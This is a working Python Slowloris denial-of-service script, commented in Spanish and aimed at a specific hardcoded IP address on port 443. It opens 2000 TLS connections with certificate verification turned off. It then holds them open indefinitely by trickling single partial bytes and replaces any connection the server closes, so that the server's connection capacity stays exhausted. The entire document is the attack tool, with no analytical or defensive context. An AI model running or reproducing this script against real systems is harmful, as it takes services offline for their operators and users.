import socket
import time
import random
import ssl
import threading

# Configuración del ataque
target_ip = "34.239.235.159"
target_port = 443
num_sockets = 2000
connection_timeout = 60  # Aumentado para reducir los timeouts

# Total de conexiones realizadas hasta ahora
total_connections = 0
active_connections = 0
lock = threading.Lock()

print(f"Iniciando ataque Slowloris mejorado a {target_ip}:{target_port}")
print(f"Intentando crear {num_sockets} conexiones...")

sockets = []

def create_socket():
    global total_connections, active_connections
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(connection_timeout)
        s.connect((target_ip, target_port))
        
        # Para HTTPS, envolvemos el socket con SSL
        if target_port == 443:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            s = context.wrap_socket(s, server_hostname=target_ip)
        
        # MÉTODO CRÍTICO: Solo enviamos un fragmento de byte
        # NO enviamos "GET" ni nada que parezca HTTP hasta que se completa
        # Solo enviamos un paquete TCP con datos incompletos
        s.send(b"G")  # Solo enviamos la primera letra de GET
        
        with lock:
            total_connections += 1
            active_connections += 1
            sockets.append(s)
        
        print(".", end="", flush=True)
        if total_connections % 100 == 0:
            print(f" {total_connections} ", end="", flush=True)
            
        return s
    except Exception as e:
        print(f"\nError creando socket: {e}")
        return None

# Crear sockets iniciales
for _ in range(num_sockets):
    create_socket()

print(f"\nSe crearon {len(sockets)} conexiones iniciales. Manteniéndolas vivas...")

# Mantener viva cada conexión
contador = 0
while True:
    contador += 1
    with lock:
        conn_activas = active_connections
    
    print(f"[Iteración {contador}] Conexiones activas: {conn_activas} / Total intentadas: {total_connections}")
    
    # Almacenamos una copia de la lista para evitar problemas durante la iteración
    socket_copy = list(sockets)
    
    for i, s in enumerate(socket_copy):
        try:
            # CRÍTICO: Solo enviamos bytes aleatorios incompletos
            # Estas NO son cabeceras HTTP válidas ni mensajes completos
            fragmento = random.choice([
                b"E",  # Segunda letra de GET
                b"e",  # Fragmento aleatorio
                b"H",  # Primera letra de Host
                b"\r"  # Retorno de carro (no completo)
            ])
            s.send(fragmento)
            
            if i % 100 == 0:
                print(".", end="", flush=True)
                
        except Exception:
            # Si hay error, cerramos el socket y lo eliminamos
            try:
                s.close()
            except:
                pass
            
            with lock:
                if s in sockets:
                    sockets.remove(s)
                    active_connections -= 1
            
            # Crear un nuevo socket para reemplazar el caído
            new_socket = create_socket()
            if not new_socket:
                print("x", end="", flush=True)
    
    print()  # Nueva línea después de cada iteración
    
    # Crear más sockets si estamos por debajo del objetivo
    with lock:
        needed_sockets = num_sockets - active_connections
    
    if needed_sockets > 0:
        print(f"Necesitamos {needed_sockets} sockets más para alcanzar el objetivo de {num_sockets}")
        for _ in range(min(needed_sockets, 200)):  # Máximo 200 por iteración para no sobrecargarse
            create_socket()
    
    time.sleep(10)  # Esperar menos tiempo para mantener las conexiones vivas